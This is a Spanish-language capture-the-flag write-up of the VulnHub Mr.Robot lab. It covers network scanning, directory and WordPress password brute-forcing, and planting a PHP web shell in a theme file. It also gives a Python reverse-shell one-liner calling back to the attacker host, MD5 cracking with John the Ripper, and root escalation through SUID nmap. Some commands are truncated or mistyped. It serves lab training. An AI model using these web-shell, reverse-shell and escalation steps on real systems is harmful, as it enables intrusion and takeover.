---
title: VulnHub-Mr.Robot
---
<dt>WriteUp-CTF</dt>
<dd>Valente2023intuicion</dd>
<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>

# [](#header-1)1).Estructura del entorno de trabajo...  
*  Maquina victima 192.168.1.85-VMware.
![imagen](/images/MrRobot/1.png)  
*  Maquina atacante 192.168.153.128-ParrotOS.
![imagen](/images/MrRobot/2.png)

```js
 #whoami
   - Este comando muestra el usuario actualmente autentificado
```
```js
 #ifconfig ens33
   - Este comando muestra en pantalla la informacion  de  la ienterfaz de red llamada "ens33"
```
`Ya enumerado nuestro espacio de trabajo prcedemos a el descubrimiento de la maquina.`

<dt>netdiscover</dt>
<dd>-Es una herramienta de investigación de red utilizada para descubrir dispositivos activos en una red.
El comando "-r" específico se  utiliza para especificar un rango de direcciones IP para escanear
en este caso desde con la dirección local de la maquina.</dd>

```js
#sudo netdiscover -r 192.168.1.67
-Este comadando realiza un escaneo ARP de la red correspondiente al rango de direcciones IP 192.168.1.0/24,
con el objetivo de identificar otros dispositivos conectados a la misma red.
En este caso identificar la direccion ip que esta utilizando nuestra victima.
```
![imagen](/images/MrRobot/3.png)

`Sabiendo que la maquina Mr.Robot se esta ejecutando desde VMware se intuye que la direccion ip de la maquina Mr.Robot es la  -192.168.1.85 con ping verificamos el alcance entre las maquinas`
```js
#ping 192.168.1.85
```
![imagen](/images/MrRobot/4.png)

`En general es común que los sistemas operativos Linux tengan un  valor predeterminado de TTL de 64. El valor de TTL es un indicador de la  distancia del sistema operativo al que se está haciendo ping. Un valor  de TTL de 64 indica que la máquina está a menos de 64 saltos de  distancia. Los sistemas operativos Windows tienen un valor de TTL de  128. Sin embargo, es importante notar que este valor puede ser modificado por  configuraciones específicas de red o aplicaciones de seguridad, por lo  que no siempre es una garantía de que un sistema operativo es Linux.`

- `Por eso "supondremos" que nos estamos enfrentando a una maquina Linux.`

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)2).Descubrimiento y enumeracion de puertos con nmap... 
```js
#sudo nmap -sV 192.168.1.85
   -Este comando realiza un escaneo de puertos en el dispositivo con dirección IP 192.168.1.85,
 utilizando la herramienta Nmap con la opción -sV, que indica que se realizará una detección de
 servicios y versiones con permisos elevados de root.
```
![imagen](/images/MrRobot/5.png)

 `Resultado`

| PORT         | STATE             |SERVICE|
|:-------------|:------------------|:------|
| 22/TCP       | Closed            | ssh   |
| 80/TCP       | Open              | http  |
| 443/TCP      | Open              |ssl/http|

- Servicio http desplegado.
![imagen](/images/MrRobot/6.png)

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)3).Ataques de fuerza bruta con diccionarios 
<dt>GoBuster</dt>
 
<dd>Herramienta de línea de comandos desarrollada en Go que se utiliza para encontrar
archivos y directorios ocultos en un servidor web. GoBuster realiza un ataque de fuerza bruta en el servidor web, 
lo que significa que intenta adivinar nombres de archivos y directorios mediante la combinación de palabras de un diccionario.</dd>

```js
#gobuster dir -u 192.168.100.167 -w /usr/share/wordlists/dirb/big.txt
-busca descubrir rutas o directorios web en un servidor web en la dirección IP 192.168.100.167,
utilizando una lista de palabras llamada "big.txt" como diccionario de fuerza bruta.

 -parametro "-u" se utiliza para especificar la URL del objetivo,
 -parametro "-w" especifica la ubicación del archivo de lista de palabras.
 -argumento "dir" especifica que se realizará una búsqueda de directorios.

Gobuster enviará solicitudes HTTP GET a la URL objetivo utilizando cada palabra del archivo de lista de palabras como parte de la ruta de la URL.
Si una ruta es válida, el servidor web devolverá una respuesta HTTP 200 OK, indicando que la ruta es accesible.
```
![imagen](/images/MrRobot/7.png)

`Resultado del escaneo con gobuster`

![imagen](/images/MrRobot/8.png)
- http://192.168.1.86/image/

![imagen](/images/MrRobot/9.png)
- http://192.168.1.86/wp-login.php

![imagen](/images/MrRobot/10.png)
- http://192.168.1.86/robots

![imagen](/images/MrRobot/11.png)
- http://192.168.1.86/key-1-of-3.txt

`Encontrando la primera flag de la maquina ` 
* 073403c8a58alf80d943455fb30724b9

![imagen](/images/MrRobot/12.png)

`Asi como un diccionario descargable llamado fsocity.dic el cual utilizaremos para explotar el sitio wordpress`

![imagen](/images/MrRobot/13.png)

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)3).codeinjecction 

```js
#sudo wpscan --url http://192.168.100.167--passwords /home/valente/Desktop/fsocity.dic --usernames elliot

Este comando de terminal ejecuta la herramienta de escaneo de vulnerabilidades
Wpscan con permisos de superusuario ("sudo") y se dirige a la dirección IP "http://192.168.100.167". 
También utiliza una lista de contraseñas ubicada en "/home/valente/Desktop/fsocity.dic" con el parámetro "--passwords"
y busca nombres de usuario con el parámetro "--usernames" especificando "elliot".
```

![imagen](/images/MrRobot/14.png)

`Obteniendo un resulado exitoso arojjando que la contraseña para el usuario Elliot es`
* ER28-0652

`Una vez ya acreeditado al sitio con la contraseña obtenida y una vez ya echo un reconocimiento al sitio se puede presumir que este usuario tiene poder para cambiar la apariencia del wordpress asi que eventualmente no encontraremos con un archivo .php editable que en este caso es "author-bio.php" con los permisos que tiene el usuario elliot inyectaremos un comando en el php agregando`

![imagen](/images/MrRobot/16.png)

```js
#echo system($_GET['guts']);

La vulnerabilidad ocurre cuando el código PHP toma una entrada sin validar 
de un usuarioy la pasa a la función system  para su ejecución.
Esto permite a un atacante inyectar comandos  maliciosos en el servidor
 y ejecutarlos con los permisos del usuario que  ejecuta el servidor web.
```
* http://192.168.100.167/wp-content/themes/twentyfifteen/author-bio.php?guts

![imagen](/images/MrRobot/17.png)

`Nos arroja que el sitio es vulnerble y que tenemos comunicacion con nuestro codigo inyectado.`

* http://192.168.100.167/wp-content/themes/twentyfifteen/author-bio.php?guts=ls

`El parámetro "ls" nos lista los archivos en el directorio.`

![imagen](/images/MrRobot/18.png)

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)4).SHELL 
```js
#nc -lvp 8080
EL comando que utiliza la herramienta "nc" (netcat) para escuchar en un  puerto específico
 (en este caso el puerto 8080) en modo de escucha (con  la opción "-l")
 y ver los datos recibidos (con la opción "-v"). Esta  acción permite a un atacante 
recibir conexiones de red y ver la  información que se envía a través de ese puerto.
```
![imagen](/images/MrRobot/19.png)

```js
#http:/192.168.100.167/wp content/themes/twentyfifteen/author bio.php?guts=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect"192.168.100.168",8080;os.dup2(s.fileno()                                                        


Esta solicitud HTTP que busca ejecutar un código  en el lenguaje Python en el servidor 
en la dirección IP victima.

El código intenta crear un socket de red y conectarse a un host en la  dirección IP "192.168.100.168" 
en el puerto 8080. Luego, utiliza la  función "os.dup2" para duplicar la entrada y salida estándar al
socket de red.

La función os.dup2 en Python es una función del módulo os que se utiliza para duplicar un
descriptor de archivo (como un socket de red) en un número determinado de descriptor de 
archivo (generalmente 0, 1 o 2, que representan la entrada, salida y error estándar, respectivamente). 

En este caso, se está utilizando os.dup2 para duplicar la entrada y salida estándar del sistema operativo
(stdin, stdout y stderr) en el socket de red que se ha creado y conectado
con s.connect(("192.168.100.168",8080)). De esta manera, cualquier entrada o salida que se realice
en la entrada y salida estándar del sistema operativo se redirigirá al socket de red,
lo que permite a un atacante realizar comandos en un sistema remoto a través de una conexión de red.
```

`Se creo la conexión y aplicando "whoami" notamos que nos encontramos con el usuario deamon en wp.`

![imagen](/images/MrRobot/20.png)

`En esta terminal es nesesario ejecutar 2 comandos mas para tener una SHELL totalmente funcional`
```js
#python -c 'import pty;pty.spawn("/bin/bash")'
Script de Python que importa el módulo pty y llama a su función "spawn" 
con "/bin/bash". La función "spawn" abre una terminal PTY 
(Pseudo-Terminal) y ejecuta el shell especificado (en este caso,  "/bin/bash").
```

```js
#export TERM=xterm-256color
La variable TERM indica al sistema operativo qué terminal emulada se está utilizando.
Al establecer TERM en "xterm-256color",se está especificando que se está utilizando una termina 
xterm con soporte de 256 colores.Esto puede ser útil para asegurarse 
de que la salida de los comandos de la terminal sea compatible con la terminal que se está utilizando.
```
![imagen](/images/MrRobot/21.png)

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠</div>
# [](#header-1)5).Root 
```js
#cat /etc/passwd
Este archivo almacena información básica sobre los usuarios en el  sistema, como nombres de usuario, 
IDs de usuario y grupo, shell de  inicio de sesión, directorios de inicio y valores de campo adicionales. 
```

![imagen](/images/MrRobot/22.png)

`El usuario que nos interesa es robot.`

![imagen](/images/MrRobot/23.png)

`listando con "ls" observamos que desde el usuario daemon es posible vizualizar el directorio
/home de robot y en este se encuentran 2 archivos ,
una contraseña codificada en md5 con permisos de lectura y la key-2-of-3.txt 
sin permisos de lectura de la maquina.`

`Extraemos la contraseña guardándola en un archivo llamado robot.txt`

```js
#john ‒format=raw-MD5 ‒wordlist=fsocity.dic robot.txt ‒rules
John the Ripper se utiliza a menudo para probar la seguridad de contraseñas y verificar su fortaleza.
En este caso, la herramienta se está utilizando para intentar "romper" una contraseña protegida 
con el formato de hash MD5 que se encuentra en un archivo llamado "robot.txt".

"--format=raw-MD5": Especifica el formato de la contraseña a crackear.                                         

"--wordlist=fsocity.dic": Especifica la lista de palabras que se usará como diccionario
para el ataque de fuerza bruta.

"robot.txt": Especifica el archivo de texto que contiene las contraseñas que se desean crackear.

"--rules": Especifica que se usarán las reglas predeterminadas de John the Ripper para aplicar transformaciones
a las palabras del diccionario y aumentar la eficacia del ataque.
```

![imagen](/images/MrRobot/24.png)

```js
#john ‒format=raw-MD5 ‒show robot.txt
"--show" muestra los valores de contraseña crackeados en el archivo "robot.txt"
```

`Comparando los resultados de el crackeo de la contraseña se presume que se obtuvo la contraseña de robot.`

![imagen](/images/MrRobot/25.png)

```js
#su robot
Cambiamos de daemon a robot con la contraseña que se obtuvo..
```

`Obtenemos acceso al usuario robot y para demostrarlo se procede a visualizar la key-2-of-3.txt`

![imagen](/images/MrRobot/27.png)

```js
#find /* -user root -perm -4000 -print 2> /dev/null
El comando  busca en el sistema de archivos, a partir de la raíz (/), 
archivos que cumplan con los siguientes criterios:

- Propietario del archivo: -user root se refiere a que el propietario del archivo es "root".

- Permisos: -perm -4000 significa que el archivo debe tener setuid activado (indicado por el bit 4000 en los permisos de archivo).

- Acción: -print imprime el nombre completo del archivo encontrado.  

El comando redirige la salida de error (2) al archivo /dev/null, lo que significa que cualquier 
error generado por la ejecución de find será descartado.
```

` Gracias a esto encontramos una versión vulnerable de nmap. `

![imagen](/images/MrRobot/28.png)

```js
#/usr/local/bin/namp ‒interactive
El comando "/usr/local/bin/nmap -interactive" inicia Nmap en modo interactivo. 
El modo interactivo permite a los usuarios ingresar y ejecutar comandos 
Nmap en línea de comando sin tener que escribir un archivo de script o  una línea de comandos compleja.
Esto puede ser útil para pruebas y  exploración de sistemas. 
```
```js
#!sh
El comando !sh en Nmap es una forma de ejecutar comandos en  un intérprete de comandos (shell) 
directamente desde la línea de  comandos de Nmap. 
Esto permite al usuario realizar tareas adicionales o  ejecutar otros comandos mientras se utiliza Nmap. 
El comando !sh  se usa para abrir una nueva sesión de shell, lo que permite al usuario 
ejecutar cualquier comando compatible con el sistema operativo en el que  se ejecuta Nmap.
```

![imagen](/images/MrRobot/29.png)

![imagen](/images/MrRobot/30.png)

`key-3-of-3.txt`

<div style="font-size: 36px; letter-spacing: 5px; color: #B40404;">☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮☮</div>
